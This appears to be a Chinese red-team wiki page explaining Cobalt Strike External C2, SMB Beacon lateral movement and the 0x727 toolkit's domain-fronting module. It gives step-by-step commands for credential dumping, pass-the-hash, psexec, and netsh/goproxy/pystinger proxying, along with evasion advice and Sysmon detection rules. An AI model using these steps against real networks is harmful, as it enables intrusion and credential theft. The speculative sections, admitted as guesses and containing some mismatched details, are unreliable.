---
title: Cobalt Strike External C2 规范与 SMB Beacon 实战详解
description: 深度解析 Cobalt Strike 核心架构细节：Team Server 与 Beacon 交互模型、Staging 分阶段加载机制、心跳包特征、多
  Team Server 分布式协作模型，并结合 External C2 通信规范、SMB Beacon 基于命名管道的横向移动实战流程（含凭据抓取、SMB Listener
  建立、psexec 横向上线不出网主机、∞∞ 标识判断）、HTTP/SOCKS 代理替代方案、流量融合技巧及主机/网络层面检测对抗策略。补充 0x727 Aggressor
  Script 工具包中 SpawnReflectiveC2 反射 DLL 注入实现域前置 C2 派生、阿里云 C2 反射 DLL 更新等 C2 基础设施隐匿技术。
category: program-analysis
tags:
- Cobalt Strike
- External C2
- SMB Beacon
- Named Pipe
- Lateral Movement
- jump psexec
- link/unlink
- Traffic Blending
- Sysmon
- Defense Evasion
- Red Teaming
- Windows Internals
- Team Server
- Staging
- Heartbeat
- Distributed C2
- 1831
- Aggressor Script
- SpawnReflectiveC2
- Domain Fronting
- Aliyun C2
- Reflective DLL Injection
- PrintSpooler
- atexec
- FRP
- Bloodhound
- Mimikatz
- goproxy
- pystinger
- Port Proxy
date: 2024-01-15
updated: '2026-11-15'
---

## 概述

Cobalt Strike 4.0+ 引入 **External C2** 规范，允许红队通过自定义通信通道（如 SMB、HTTP、DNS、云存储等）隐蔽地传输 Beacon 流量。其中 **SMB Beacon** 利用 Windows 命名管道封装于 SMB 协议，实现**无需目标机器直连互联网**即可通过已控主机（父 Beacon）跳板上线的横向移动能力。本页系统梳理其核心架构细节、协议原理、实战操作链路（含 ∞∞ 标识判断要点）、代理替代方案、流量融合思路及蓝队检测视角，**并补充 0x727 团队开源的 Aggressor Script 工具包中 SpawnReflectiveC2 反射 DLL 注入实现域前置 C2 派生、阿里云 C2 反射 DLL 更新等 C2 基础设施隐匿技术实现细节**。

> 交叉引用：[[smb-named-pipe-c2-communication]] 已系统梳理 SMB 协议与命名管道原理、Cobalt Strike SMB Beacon 架构、主机/网络层面检测手段及缓解措施，可作配套参考。
> 交叉引用：[[0x727-cobalt-strike-aggressor-script-toolkit]] 记录 0x727 团队开源的 Cobalt Strike Aggressor Script 工具包全功能清单，含 Mimikatz、Bloodhound、FRP、PrintSpooler、atexec、SpawnReflectiveC2 等模块。

---

## Cobalt Strike 核心架构细节

### Team Server 与 Beacon 交互模型

Cobalt Strike 采用 **B/S 架构**（Browser/Server，基于 HTTP 协议），而非传统的 C/S 架构。Team Server 充当 Web 服务器角色，Beacon 作为客户端通过 HTTP/S 或 DNS 与其通信。

#### 通信流程模型

```
[Operator Client] <-- WebSocket/TCP --> [Team Server (HTTP/S)] <-- HTTP/S/DNS --> [Beacon]
                                                    │
                                                    │ 任务队列
                                                    ▼
                                          [Staging Server / Payload Hosting]
```

1. **任务队列机制**：Team Server 将操作员发送的所有动作封装为**计划任务**排队存储。Beacon 定期轮询下载任务列表，执行后回传结果。
2. **异步通信模式**：Beacon 默认采用异步通信（低频、慢速），通过 `sleep` 和 `jitter` 控制心跳间隔，降低被流量分析发现的概率。
3. **交互式通信模式**：当操作员需要实时控制时，可切换为交互模式，Beacon 缩短轮询间隔实现近实时响应。

#### 两种通信策略对比

| 策略 | 特点 | 适用场景 | 检测风险 |
|------|------|----------|----------|
| **异步式通信** | 频率低、速度慢、隐蔽性强 | 长期潜伏、数据窃取、内网侦察 | 低（流量融合正常业务） |
| **交互式通信** | 实时控制、响应快 | 权限提升、横向移动、实时操作 | 高（流量特征明显） |

> **关键点**：Beacon 内置的 `job` 命令即用于查看当前任务队列状态，体现了“计划任务队列”设计模式。

---

### Staging 分阶段加载机制

为了绕过内存限制、EDR 静态查杀及网络传输体积限制，Cobalt Strike 采用 **Stager + Stage** 两阶段加载模型。

#### 组件定义

| 组件 | 别名 | 典型大小 | 功能 | 实现形式 |
|------|------|----------|------|----------|
| **Stager** | Payload Stager | ~200-500 bytes | 下载 Stage、内存注入、传递执行 | 手工优化汇编 Shellcode |
| **Stage** | Payload Stage / Beacon DLL | ~300-500 KB | 完整后渗透功能模块 | Reflective DLL Injection |

#### Staging 过程详解

```
[Exploit / Initial Access] 
        │
        ▼
[Stager Shellcode 执行] ──→ 连接 Staging Server (Team Server 或独立 HTTP 服务)
        │
        ▼
[下载 Stage (Beacon DLL) 到内存]
        │
        ▼
[Reflective Loader 解析 PE、修复 IAT、重定位、调用 DllMain]
        │
        ▼
[Beacon 初始化：配置解析、管道创建、心跳线程启动]
        │
        ▼
[首次回连 Team Server：上传元数据、下载任务队列]
```

#### Staging Server 角色与风险

- **职责**：托管 Stage Payload、接收 Beacon 初始回连、承担初始提权与持久化 Payload 投递
- **暴露风险高**：直接面向目标网络，易被溯源、封锁、反制
- **最佳实践**：**物理隔离** Staging Server 与长期控制的 Team Server（Long-haul Server），甚至使用一次性基础设施

> 交叉引用：[[pe-manual-mapping-loader-implementation]] 详细剖析了 Reflective DLL Injection 的完整实现流程（节区映射、导入表修复、重定位修正、入口点执行），可辅助理解 Stage 加载的底层细节。

---

### 心跳包特征分析

Beacon 通过 **HTTP Cookie** 字段传输心跳标识与加密元数据，这是其最显著的网络指纹特征。

#### 心跳包结构

```
HTTP Request:
GET /<uri> HTTP/1.1
Host: <teamserver>
Cookie: <base64(encrypted_metadata)>
User-Agent: <malleable_profile_ua>
...
```

#### Cookie 字段解析

| 字段 | 说明 | 加密方式 |
|------|------|----------|
| **Beacon ID** | 唯一标识符（随机生成） | AES-256 (密钥派生自共享密钥) |
| **任务请求标志** | 请求任务队列 / 回传结果 | 同步加密 |
| **元数据** | 系统信息、进程上下文、输出结果 | 分块加密，大数据分包传输 |

#### 默认心跳行为

- **间隔**：默认 60 秒（可通过 `set_sleep` 修改）
- **抖动**：默认 0%（建议设置 20%-30% 模拟人类行为）
- **特征**：Cookie 长度固定、Base64 编码后熵值高、无标准 Cookie 属性（如 `Path`、`Domain`、`HttpOnly`）

#### Malleable C2 Profile 伪装心跳

```profile
http-get {
    client {
        header "Cookie" "SESSIONID={{BASE64_ENCODED_METADATA}}; preference=dark_mode; lang=en-US";
        metadata {
            base64;
            print;
        }
    }
    server {
        header "Set-Cookie" "SESSIONID={{BASE64_ENCODED_TASKS}}; Secure; HttpOnly; SameSite=Lax";
    }
}
```

> **蓝队检测建议**：重点监控 **Cookie 熵值异常高、缺乏标准属性、长度固定、周期性出现** 的 HTTP 请求；结合 JA3S 指纹、User-Agent 一致性综合研判。

---

### 多 Team Server 分布式协作模型

Cobalt Strike 设计支持**分布式红队行动**，单个 Client 可同时连接多个 Team Server，实现基础设施隔离与角色分工。

#### 官方推荐的三层服务器模型

```
┌─────────────────────────────────────────────────────────────┐
│                    Operator Client (Cobalt Strike Client)   │
│  可同时连接多个 Team Server，统一视图管理所有 Beacon 会话      │
└──────────────┬──────────────────────┬────────────────────────┘
               │                      │
       ┌───────▼───────┐      ┌───────▼───────┐
       │ Staging Server│      │ Long-haul C2  │
       │ (Short-lived) │      │ (Persistent)  │
       │               │      │               │
       │ • Payload宿主  │      │ • 长期会话维持  │
       │ • 初始上线接收 │      │ • 任务分发下发  │
       │ • 一次性基建   │      │ • 数据聚合存储  │
       └───────┬───────┘      └───────┬───────┘
               │                      │
               │              ┌───────▼───────┐
               │              │ Post-Exploit  │
               │              │   Server      │
               │              │ (Optional)    │
               │              │               │
               │              │ • 敏感操作隔离  │
               │              │ • 凭据/数据处理 │
               │              │ • 高价值目标    │
               └──────────────┴───────────────┘
```

#### 协作机制

| 机制 | 说明 |
|------|------|
| **共享会话文件** | `~/.cobaltstrike/` 下共享 `.cobaltstrike.beacon_keys`、任务队列、截图、下载文件 |
| **Beacon 元数据同步** | 多 Client 连接同一 Team Server 时，实时同步 Beacon 列表、输出、文件浏览器状态 |
| **跨服务器链路** | 通过 `link`/`unlink` 将不同 Team Server 下的 Beacon 串联，形成统一拓扑 |

#### 实战部署建议

1. **Staging Server**：云厂商抢占式实例、一次性 VPS、仅开放 HTTP/HTTPS 端口、行动后即销毁
2. **Long-haul C2**：隐蔽 VPS、域前置/CDN 保护、严格入站 IP 白名单、定期轮换证书
3. **Post-Exploit Server**：内网跳板机、仅允许 Long-haul C2 访问、部署敏感工具（Mimikatz、BloodHound、自定义 Loader）

> 交叉引用：[[mimikatz-source-code-architecture-golden-ticket-audit]] 中的凭据导出与黄金票据构造操作，建议在隔离的 Post-Exploit Server 上执行，降低核心 C2 暴露风险。

---

## 0x727 Aggressor Script 工具包：C2 基础设施隐匿增强模块

### 工具包概览

0x727 安全团队开源的 **Cobalt Strike Aggressor Script 工具包**（[[0x727-cobalt-strike-aggressor-script-toolkit]]）集成了多个 Aggressor Scripts 与多个 PE 文件，形成一个 CNA 工具包，仅需加载到 Cobalt Strike 即可获得便捷、快速的红队渗透能力。该工具包使用 **Aggressor Script、C++、C#** 编写，覆盖红队渗透测试全生命周期。

> **项目定位**：根据 Cobalt Strike 标准文档集成多种功能的 Aggressor Scripts，解决红队工作中大量在 C2 中实现的需求。

### 核心功能模块矩阵

| 模块分类 | 核心功能 | 实现技术 | 更新时间节点 |
|----------|----------|----------|--------------|
| **Mimikatz 系列** | Hash 传递、DcSync、克隆管理员到 Guest、抓取密码、Skeleton Key 后门、krbtgt Hash、黄金票据、访问令牌操控 | Aggressor Script + Mimikatz | 2020/01/08 |
| **凭据获取** | 一键转储 lsass.exe、Lazagne、Navicat 密码读取 | Procdump + Lazagne + 定制工具 | 2020/01/08 |
| **域信息收集** | Bloodhound (PowerShell / C# 版) 一键执行 | Bloodhound 集成 | 2020/01/08 |
| **代理隧道** | **一键配置 FRP 代理** | FRP (Fast Reverse Proxy) | 2020/01/08 |
| **提权模块** | **PrintSpooler 打印机提权**、提权脚本整合至 `elevate.cna` | PrintSpooler 漏洞利用 | 2020/07/07 |
| **横向移动** | **atexec 横向移动** | atexec (任务计划/SCM) | 2020/07/07 |
| **C2 派生与隐匿** | **SpawnReflectiveC2 反射 DLL 注入实现域前置 C2 派生**、**更新派生 Aliyun C2 的反射 DLL** | Reflective DLL Injection + Domain Fronting + 云厂商 API | 2020/07/07、2020/07/10 |
| **通知告警** | 钉钉机器人提醒（适配 macOS、Windows 10、Linux） | 钉钉机器人 API | 2020/03/11、2020/07/07 |
| **脚本修复** | 修复若干 PowerShell 脚本加载问题 | PowerShell 加载器优化 | 2020/07/07 |

---

### SpawnReflectiveC2：反射 DLL 注入实现域前置 C2 派生

#### 技术原理

**SpawnReflectiveC2** 是 0x727 工具包中实现 **C2 基础设施隐匿** 的核心模块。其核心思路是利用 **反射式 DLL 注入 (Reflective DLL Injection, RDI)** 技术，在内存中加载并执行定制的 Beacon DLL（Stage），并通过 **域前置** 技术将 C2 流量伪装为合法的高信誉域名（如 CDN、云服务商）流量，实现 “派生” 出新的、隐蔽性更强的 C2 通道。

#### 实现流程

```
[Parent Beacon] 
      │
      ├─→ 加载 SpawnReflectiveC2 Aggressor Script
      │
      ├─→ 读取内嵌/下载的定制 Stage DLL (Beacon DLL)
      │       │
      │       ├─→ 配置 Malleable C2 Profile: 域前置域名、CDN 边缘节点
      │       ├─→ 修改 HTTP Host 头、SNI 为前置域名
      │       └─→ 内嵌合法证书指纹/公钥哈希 (Certificate Pinning 绕过)
      │
      ├─→ 反射加载器 (Reflective Loader) 执行:
      │       1. 申请 RWX 内存 (VirtualAlloc)
      │       2. 解析 PE 头、节区映射、导入表修复 (IAT)、重定位表修正
      │       3. 调用 DllMain (DLL_PROCESS_ATTACH)
      │       4. Beacon 初始化: 解析配置、创建心跳线程、建立命名管道/HTTP 通道
      │
      └─→ 派生出的 Child Beacon 通过域前置通道回连 Team Server
              │
              ├─→ 流量特征: 目标 IP 为 CDN 边缘节点、Host 头为合法域名、TLS SNI 匹配
              ├─→ 绕过: 基于 IP/域名的威胁情报封锁、SNI 检测、证书透明度日志监控
              └─→ 归因难度: 极高 (流量混入海量合法云服务流量)
```

#### 关键技术细节

| 技术点 | 实现要点 | 对抗价值 |
|--------|----------|----------|
| **反射加载器** | 无需落地磁盘、无需 `LoadLibrary`、手工解析 PE、修复 IAT/重定位、调用入口点 | 绕过 AV/EDR 磁盘扫描、DLL 加载回调监控 (如 `PsSetLoadImageNotifyRoutine`) |
| **域前置配置** | Malleable Profile 中设置 `http-get.client.header "Host" "legit.cdn.domain"`、配置 `sni`、前置域名需支持 SNI 路由 | 利用 CDN/SNI 机制隐藏真实 C2 服务器 IP，流量在 TLS 握手层面伪装为访问合法服务 |
| **证书处理** | 内嵌合法证书公钥哈希、或利用云厂商托管证书、配置 `ssl_verify` 策略 | 绕过证书绑定/透明度检测，建立受信任 TLS 连接 |
| **进程伪装** | 可选注入到合法进程 (如 `msedge.exe`、`Teams.exe`、`OneDrive.exe`) 或创建挂起进程注入 | 进程上下文合法化，绕过基于进程树/命令行的行为分析 |
| **x86 兼容性** | 2020/07/10 更新注记：“由于 Cobalt Strike 4.0 判断进程位数有点问题，暂时使用 x86 测试通过” | 提示在 64 位目标上需注意 WoW64 环境下的反射加载器架构匹配问题 |

> 交叉引用：[[pe-manual-mapping-loader-implementation]] 提供了反射式 DLL 加载器的完整 C++ 实现参考（节区映射、导入表修复、重定位修正、入口点执行），可辅助理解 SpawnReflectiveC2 底层加载逻辑。
> 交叉引用：[[c2-redirectors-malleable-c2-profiles]] 系统梳理了 Malleable C2 Profile 流量混淆配置要点、域名前置与 CDN 隐匿技巧，为 SpawnReflectiveC2 的 Profile 编写提供最佳实践参考。

#### 实战操作示例 (Aggressor Script)

```cna
# SpawnReflectiveC2 模块调用示例 (伪代码，基于工具包功能描述)
command spawn_reflective_c2 {
    local('$bid $domain_front $cdn_ip $profile_path $dll_path');
    $bid = beacon_id($1);
    $domain_front = "assets.cdn.cloudflare.com";  # 前置域名
    $cdn_ip = "104.16.0.1";                       # CDN 边缘节点 IP
    $profile_path = "/opt/c2profiles/domain_front.profile";
    $dll_path = "/opt/payloads/beacon_x86.dll";   # 注记: 暂用 x86

    # 1. 生成/加载域前置 Malleable Profile
    # 2. 读取 Stage DLL 字节码
    # 3. 通过反射加载器在目标进程内存中执行
    btask($bid, "Tasking SpawnReflectiveC2: Domain Front -> " . $domain_front, "T1572.001");
    
    # 实际实现中会通过 Aggressor Script 调用内嵌的 PE 加载器 Shellcode
    # 或调用外部 Exe (如 SpawnReflectiveC2.exe) 执行注入
}
```

---

### 阿里云 C2 反射 DLL 更新 (2020/07/10)

#### 更新背景

2020 年 7 月 10 日，工具包更新日志明确记录：**“更新派生 Aliyun C2 的反射 DLL”**。这表明 0x727 团队针对 **阿里云基础设施** 定制了基于反射 DLL 注入的 C2 派生模块，利用阿里云 CDN、OSS、API 网关等服务实现域前置或流量融合。

#### 技术推测与实现方向

基于 “SpawnReflectiveC2” 通用框架及阿里云服务特性，该更新可能包含：

| 方向 | 具体实现思路 | 阿里云服务映射 |
|------|--------------|----------------|
| **阿里云 CDN 域前置** | 申请阿里云 CDN 加速域名、配置回源至 Team Server、Malleable Profile 设置 `Host` 为 CDN 域名、`SNI` 匹配 | 阿里云 CDN (支持自定义回源 Host、HTTPS 回源、SNI 透传) |
| **OSS 存储桶通信** | Beacon 通过 OSS SDK/API 上传下载任务/结果文件、利用 OSS 默认域名 (`bucket.oss-region.aliyuncs.com`) 或绑定自定义域名 | 阿里云 OSS (支持静态网站托管、自定义域名、HTTPS) |
| **API 网关/函数计算** | 部署 HTTP 触发函数作为重定向器、或利用 API 网关自定义域名代理流量到 Team Server | 阿里云 API 网关、函数计算 (FC) HTTP 触发器 |
| **阿里云证书服务** | 申请阿里云托管的免费 DV 证书、配置到 Malleable Profile `certificate` 字段、实现合法 TLS 指纹 | 阿里云 SSL 证书服务 (支持 Let's Encrypt 等 CA) |
| **流量融合伪装** | 构造符合阿里云服务特征的 HTTP 头、User-Agent、请求路径模式 (如 `/api/`, `/oss/`, `/cdn/`) | 模拟合法阿里云 SDK/客户端流量特征 |

#### 反射 DLL 定制要点

1. **内嵌配置**：Stage DLL 编译时内嵌阿里云专用 Malleable Profile 配置 (Host、SNI、URI、证书哈希、睡眠策略)。
2. **架构适配**：延续 “暂时使用 x86 测试通过” 策略，提供 x86/x64 双架构反射 DLL，或实现运行时架构检测加载对应 Payload。
3. **免杀强化**：结合工具包中 “修复若干 PowerShell 脚本加载问题” 经验，对反射加载器 Shellcode 进行混淆、编码、分段加载，绕过静态特征匹配。
4. **动态配置获取**：支持 Beacon 启动时从阿里云 Parameter Store、Secrets Manager 或 OSS 对象拉取最新 C2 配置，实现配置与代码分离、动态轮换。

> **实战价值**：利用阿里云等国内主流云厂商的高信誉基础设施作为 C2 前置层，流量在企业内网出口防火墙、威胁情报平台中极难被判定为恶意，显著提升红队基础设施生存周期。

---

### 配套红队工具链集成

工具包将 SpawnReflectiveC2 与以下模块有机结合，形成完整的 “初始访问 → 凭据获取 → 横向移动 → C2 隐匿派生” 攻击链：

| 模块 | 在攻击链中的定位 | 与 SpawnReflectiveC2 协同点 |
|------|------------------|------------------------------|
| **Mimikatz 系列** | 凭据获取、权限提升、持久化 (黄金票据) | 导出的凭据/票据用于 `pth`/`psexec` 横向部署 SpawnReflectiveC2 派生的 Child Beacon |
| **PrintSpooler 提权** | 本地提权 (SYSTEM) | 获取 SYSTEM 权限后，以更高上下文加载反射 DLL、绕过 UAC/受保护进程限制 |
| **atexec 横向移动** | 远程命令执行、部署 Payload | 替代 `jump psexec`，通过任务计划在远程主机落地 SpawnReflectiveC2 Loader |
| **FRP 代理** | 内网穿透、SOCKS 代理 | 为无法直连互联网的 Child Beacon 提供出站通道，配合 SpawnReflectiveC2 实现多跳 C2 拓扑 |
| **Bloodhound** | 域信息收集、攻击路径推演 | 识别高价值目标、关键服务器、信任关系，指导 SpawnReflectiveC2 派生部署策略 |
| **钉钉机器人** | 实时告警、操作审计 | 关键节点 (上线、提权、派生成功/失败) 实时推送至钉钉群，提升团队协作态势感知 |

---

## SMB 协议与命名管道通信基础

### SMB 协议在 Windows 防火墙中的默认放行特性

- **协议定位**：OSI 应用/表示层，常跑在 TCP 445 (SMB over TCP) 或 NBT (NetBIOS over TCP/IP) 之上。
- **认证模型**：用户级（用户名+密码/NTLM/LM 质询-响应）与共享级（共享密码）。
- **防火墙默认行为**：Windows Defender Firewall **默认允许入站/出站 SMB (TCP 445)**，导致 `Bind()` TCP Socket 会被 Defender 拦截弹窗，而 SMB 通信往往静默通过。

### 命名管道

- **本质**：基于 SMB 的进程间通信 (IPC) 机制，支持本地/跨网络、单向/双向、可靠传输。
- **核心 API**：
  - 服务端：`CreateNamedPipe()`、`ConnectNamedPipe()`
  - 客户端：`CreateFile()`、`CallNamedPipe()`
- **默认安全描述符**：`LocalSystem`、`Administrators`、`Creator Owner` 获得 `Full Control`；`Everyone` 与 `Anonymous` 获得 `Read`。

> 交叉引用：[[windows-syscall-internals-sysenter-kifastcallentry]] 可辅助理解用户态到内核态的系统调用流程，命名管道操作最终经由 `NtCreateFile`/`NtFsControlFile` 进入内核。

---

## External C2 通信模型与 SMB Beacon 架构

### External C2 规范

- **定位**：Cobalt Strike 团队服务器与 Beacon 之间的**通信协议抽象层**，允许开发者实现任意传输协议（HTTP/S、DNS、SMB、云盘、Slack、OneDrive 等）。
- **核心组件**：
  - **External C2 Server**：实现规范的中间件，负责与 Team Server 通信（通常通过本地 TCP/Unix Socket），并向 Beacon 提供自定义协议接口。
  - **External C2 Client (Beacon)**：加载第三方通信模块（如 SMB Named Pipe Client），替代原生 HTTP/DNS 通信。
- **流量融合优势**：将 C2 流量伪装成合法业务流量（如 Office 365、Google Drive、Dropbox、内部文件共享、AD 复制流量），绕过边界防火墙与流量分析。

### SMB Beacon 通信拓扑

```
[Team Server] <--HTTP/S/DNS--> [Parent Beacon (Internet-facing, runs External C2 Server)]
                                      │
                                      │ SMB (TCP 445) + Named Pipe (\\.\pipe\msagent_*)
                                      ▼
                              [Child Beacon (Internal, no Internet, runs SMB Client)]
```

- **Parent Beacon** 充当 **SMB Server**（监听命名管道 `\\.\pipe\<pipe_name>`）。
- **Child Beacon** 充当 **SMB Client**（通过 `CreateFile("\\\\target\\pipe\\<pipe_name>")` 连接）。
- 通信完全在内网完成，**Child Beacon 无需出站 Internet**。

### 适用场景

> 已控一台可出网主机（Parent），目标内网另一台 Windows 拥有本地 `Administrator` 凭据且 445 端口通达，但**无法直接出网**。需通过 Parent 跳板将 Child 拉上线。

---

## SMB Beacon 实战操作链路（含 ∞∞ 标识判断）

> 以下流程基于实战归档文章《不出网主机上线方法》整理，环境：DMZ 主机 (Win2008 R2, 双网卡 192.168.111.132/192.168.204.188) 作为 Parent，内网主机 (Win2012, 192.168.204.141) 作为 Target，C2 (Kali, 192.168.111.129)。

### 前置条件

| 条件 | 说明 |
|------|------|
| 凭据 | 目标主机本地 `Administrator` 用户名/密码或 NTLM Hash |
| 网络 | Parent 与 Child 之间 TCP 445 可达 |
| 权限 | Parent Beacon 上下文需具备足够权限发起 SMB 会话（通常需高权限） |

### 标准操作步骤

#### 获取 Parent Beacon 并抓取凭据

在 DMZ 主机 (Web Server) 上线 CS 后，使用 Mimikatz 抓取明文密码或 Hash。

```text
beacon> run mimikatz
# 或使用 0x727 工具包集成的一键导出模块
```
> 交叉引用：[[mimikatz-source-code-architecture-golden-ticket-audit]] 详细解析 sekurlsa::logonpasswords 实现原理。

#### 建立 SMB Listener (Bind Pipe)

在 Cobalt Strike 客户端：`Cobalt Strike` -> `Listeners` -> `Add`。
- **Payload**: `Windows/64` (或 x86)
- **Listener Type**: `SMB (Bind Pipe)`
- **Bind Pipe Name**: 默认 `msagent_<Random>`，建议在 Malleable Profile 中自定义 `stage.pipe_name` 为合法管道名（如 `lsarpc`, `samr`, `eventlog` 等）以融合基线。
- **Port**: 445 (默认)

#### 利用 psexec 进行横向移动 (jump psexec64)

在 Parent Beacon 交互控制台执行：

```text
# 1. 探测内网 445 端口 (可选)
beacon> portscan 192.168.204.0/24 445

# 2. 建立 SMB 会话并填充令牌 (Pass-the-Hash / 明文密码均可)
beacon> shell net use \\192.168.204.141\admin$ /user:"administrator" "test1234@"
# 或使用 pth (需 administrator 权限)
beacon> pth 192.168.204.141 administrator <NTLM_HASH>

# 3. 横向生成 SMB Beacon
beacon> jump psexec64 192.168.204.141 smb
# 参数说明：目标IP + payload 类型 (smb 即 bind_pipe)
```

> **关键点**：
> - `jump psexec64` 底层利用 **服务控制管理器 (SCM)** 远程创建服务启动 Payload，服务二进制内嵌 **Named Pipe Client** 逻辑连回 Parent 的 `bind_pipe` 监听器。
> - **凭据必须为 Administrator 权限**，否则 SCM 创建服务失败 (Access Denied)。
> - 默认管道名 `msagent_<Random>`，可在 Malleable C2 Profile 中通过 `stage.pipe_name` 自定义。

#### 连接成功判断：∞∞ 标识

**核心判断要点**：横向成功后，在 Cobalt Strike Beacon 列表视图中，**子 Beacon (SMB Beacon) 所在行的右侧会显示 `∞∞` 标识**（类似无限符号叠加），表示该会话通过命名管道链路连接，而非直接连接 Team Server。

![SMB Beacon 上线 ∞∞ 标识示意](../Images/0fac9f413a33e12c0038b6ebcf31c599.png)
*(注：原文截图显示 smb beacon 上线的主机右侧有 ∞∞ 标识)*

#### 会话管理：断开与恢复 (link/unlink)

- **断开链路** (父/子会话均可执行，子 Beacon 不退出，转入监听模式)：
  ```text
  beacon> unlink 192.168.204.141 <Child_Beacon_PID>
  # 或在父 Beacon: unlink <Child_Beacon_ID>
  ```
- **恢复链路** (从任意 Beacon 连接)：
  ```text
  beacon> link 192.168.204.141 msagent_<Random>
  ```

---

## 替代方案：不出网主机的代理上线策略

当 SMB 445 端口不通、或无 Administrator 凭据、或需更隐蔽的流量特征时，可采用 HTTP/SOCKS 代理将内网流量转发至 Parent 再出网。

### 方案一：goproxy + netsh 端口代理 (HTTP 代理)

#### 原理
在 Parent (DMZ 主机) 部署 goproxy 开启 HTTP 代理端口 (如 8080)，利用 Windows 原生 `netsh interface portproxy` 将内网网卡的特定端口 (如 822) 转发至公网网卡的 goproxy 端口 (8080)。Target 通过内网 IP:822 访问，实质经 Parent 出网到 C2。

#### 实战步骤

1. **Parent 部署 goproxy**：
   ```cmd
   # 上传 proxy.exe 到 DMZ 主机
   shell C:\proxy.exe http -t tcp -p :8080
   ```
2. **配置 netsh 端口转发** (需管理员权限)：
   ```cmd
   # 监听内网 IP 192.168.204.188 的 822 端口，转发至公网 IP 192.168.111.132 的 8080 端口
   shell netsh interface portproxy add v4tov4 listenaddress=192.168.204.188 listenport=822 connectaddress=192.168.111.132 connectport=8080
   ```
   *验证*：`netstat -ano | findstr :822`
3. **C2 创建 HTTP Listener**：
   - Host: `192.168.204.188` (DMZ 内网 IP)
   - Port: `822`
   - **关键**：勾选 `Proxy` 或在 Profile 中配置 HTTP 代理行为，或直接利用 Stageless Payload 指向该地址。
4. **生成 Stageless Payload 上线**：
   - 原因：Target 无法直连 C2 下载 Stage，需使用包含完整逻辑的 Stageless (Artifact -> Windows Executable S)。
   - 执行上传运行，流向：`Target(192.168.204.141) -> DMZ_Internal(192.168.204.188:822) -> DMZ_Public(192.168.111.132:8080) -> C2(192.168.111.129)`。

> **Stage vs Stageless**：Stager 分阶段加载需目标能直连 Staging Server 下载 Stage；Stageless 体积大但自包含，适合仅能访问代理跳板的场景。

### 方案二：pystinger 搭建 SOCKS4 代理

#### 原理
服务端由 Webshell (`proxy.php`) + `stinger_server.exe` 构成。Webshell 负责流量转发 (HTTP 隧道)，`stinger_server.exe` 在内存中建立 SOCKS4 代理服务。Client 端 (`stinger_client`) 连接 Webshell，本地开启 SOCKS4 端口供工具 (如 CS、MSF) 使用。

#### 实战步骤

1. **Target/Web Server 部署**：
   - 上传 `proxy.php` 至 Web 目录 (访问返回 `UTF-8` 正常)。
   - 上传 `stinger_server.exe` 并执行：`start stinger_server.exe 0.0.0.0` (默认监听 1080 或指定端口)。
2. **C2/Kali 启动 Client**：
   ```bash
   ./stinger_client -w http://192.168.111.132:81/proxy.php -l 127.0.0.1 -p 60000
   # 本地 60000 开启 SOCKS4 代理
   ```
3. **CS 创建 Listener 配置 SOCKS 代理**：
   - Host: `192.168.204.188` (DMZ 内网 IP)
   - Port: `60020` (或自定义转发端口，需配合 `stinger_server` 配置)
   - 实际上是 CS 通过本地 SOCKS 代理 (60000) 连接 Target。
4. **横向上线**：使用 `jump psexec64` 选择该 Listener，Target 上线。

> 优势：流量封装在 HTTP (Webshell) 中，边界防火墙仅见 Web 访问；SOCKS4 支持 TCP 转发，兼容性强。

---

## External C2 流量融合技巧

| 融合载体 | 典型实现思路 | 隐蔽性评价 | 实现复杂度 |
|----------|--------------|------------|------------|
| **云存储 (OneDrive/Google Drive/Dropbox)** | Beacon 读写指定文件夹文件，Team Server 同步监控 | 极高（业务合法流量） | 中（需 OAuth/应用注册） |
| **协作平台** | Slack/Teams/GitHub Gist/API 发布/拉取指令 | 高 | 中低（REST API 友好） |
| **内部文件共享/AD SYSVOL** | 利用域内现有共享目录读写 Beacon 元数据 | 高（内网基线流量） | 低（原生 SMB API） |
| **数据库/消息队列** | Redis/MQTT/SQL Server 表/队列传递任务 | 中高 | 中（需连接库/驱动） |
| **自定义协议** | 基于 External C2 SDK 编写专用 Client/Server | 可控，需开发投入 | 高（全栈开发） |
| **云厂商 CDN/网关 (阿里云/Cloudflare/AWS)** | **SpawnReflectiveC2 + 域前置**：反射加载配置前置域名的 Stage DLL，流量经 CDN 边缘节点回源 | **极高 (顶级云信誉、海量合法流量掩护)** | 中高 (需备案/实名、证书管理、CDN 配置) |

> **核心原则**：**“Living off the Land”**——复用目标环境已有的合法通信基础设施，而非引入异常协议/端口。**0x727 工具包的 SpawnReflectiveC2 与阿里云 C2 反射 DLL 正是该原则在 “云厂商基础设施” 载体上的深度实践。**

---

## 蓝队检测与对抗视角

### 主机层检测

| 检测点 | 数据源 | 典型规则 |
|--------|--------|----------|
| **已知恶意管道名** | Sysmon Event ID 17 (Pipe Created) | `PipeName == "msagent_*"`、`"postex_*"`、`"c2_*"` |
| **异常进程创建管道** | Sysmon Event ID 17 | `Image != "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" AND PipeName NOT LIKE "mojo.*"` |
| **异常安全描述符** | Sysmon Event ID 17 / NtObjectManager | `SecurityDescriptor.DACL.Allow.Everyone.FullControl == True` |
| **远程管道连接** | Sysmon Event ID 18 (Pipe Connected) | `Image == "System" AND SourceIp != Localhost` |
| **服务创建异常** | Sysmon Event ID 1 (Process Create) + Security 7045 | `ServiceName 匹配随机字符串 AND ImagePath 指向非标准路径` |
| **反射加载器行为** | EDR 用户态 Hook / 内存扫描 | `VirtualAlloc(RWX) + 手工 PE 解析 + IAT 修复 + DllMain 调用`、`无磁盘落地 DLL`、`调用栈异常 (无 LoadLibrary)` |
| **域前置流量特征** | 网络代理/防火墙 TLS 检查 | `SNI 与 Host 头不一致`、`目标 IP 属已知 CDN 段但 Host 为非自有域名`、`证书透明度日志无对应记录` |

> 交叉引用：[[smb-named-pipe-c2-communication]] 已详细列举 Sysmon Event ID 17/18 字段解析、基线建立方法及 Wireshark 抓包分析 SMB 命名管道流量。
> 交叉引用：[[memory-scanning-tools-evasion-techniques]] 系统梳理 Hunt-Sleeping-Beacons、BeaconHunter、patriot、moneta、pe-sieve、MalMemDetect 等内存扫描工具原理，及 FOLIAGE、Ekko、AceLdr、Inceptor 等 UDRL 规避实现对抗细节。

### 网络层检测

| 检测点 | 数据源 | 典型规则 |
|--------|--------|----------|
| **异常主机间 SMB 会话** | Zeek/Suricata/NetFlow | `src_ip ∈ User_VLAN AND dst_ip ∈ Server_VLAN AND dst_port == 445 AND session_duration > 300s` |
| **高频小包双向传输** | 全流量捕获 | `SMB2/3 Read/Write 包大小 < 1KB AND 间隔 < 5s` |
